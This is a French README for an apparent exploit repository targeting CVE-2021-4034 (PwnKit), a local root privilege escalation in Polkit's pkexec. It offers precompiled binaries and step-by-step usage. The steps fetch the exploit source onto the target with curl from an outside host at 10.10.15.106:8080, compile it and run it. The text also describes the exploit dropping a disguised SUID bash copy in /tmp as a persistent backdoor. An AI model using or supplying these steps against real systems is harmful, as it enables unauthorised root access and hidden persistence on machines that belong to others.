# CVE-2021-4034 (PwnKit) — Exploit

<img width="879" height="568" alt="Capture d’écran du 2026-10-30 15-18-14" src="https://github.com/user-attachments/assets/d90de057-602f-4ffc-b535-5721a0e17d44" />

## Description

Ce dépôt contient un exploit fonctionnel pour la vulnérabilité **CVE-2021-4034**, 
surnommée **PwnKit**, affectant l'utilitaire `pkexec` de Polkit.

Toutes les versions de Polkit sorties entre mai 2009 et janvier 2022 sont concernées.

Cette vulnérabilité permet une élévation de privilèges locale : d'un utilisateur 
non privilégié à **root**.

## Fonctionnement

En plus d'ouvrir un shell root, l'exploit crée une copie de `bash` avec le bit 
SUID activé, dans `/tmp/vmware-000000004G3NtP4Th0G3N3`.

## Utilisation

### Option 1 — Binaires précompilés

Deux binaires précompilés sont fournis, adaptés à des versions plus anciennes 
et plus récentes des cibles Linux.

1. Télécharger le binaire et le fichier `.so` correspondant dans le même répertoire
2. Rendre le binaire exécutable et le lancer :

```bash
chmod +x main
./main
```

### Option 2 — Compilation depuis les sources

Pour une efficacité optimale, il est recommandé de compiler le code source en 
fonction de la version exacte de la cible.

**1. Télécharger les sources** (remplacer `ip:port` par les vôtres) :

```bash
curl http://10.10.15.106:8080/ascii.c -o ascii.c
curl http://10.10.15.106:8080/main.c -o main.c
```

**2. Compiler** (les warnings à la compilation sont liés à la bannière ASCII, sans impact fonctionnel) :

```bash
gcc main.c -o main
gcc -shared -fPIC ascii.c -o ascii.so
```

**3. Exécuter :**

```bash
chmod +x main
./main
```
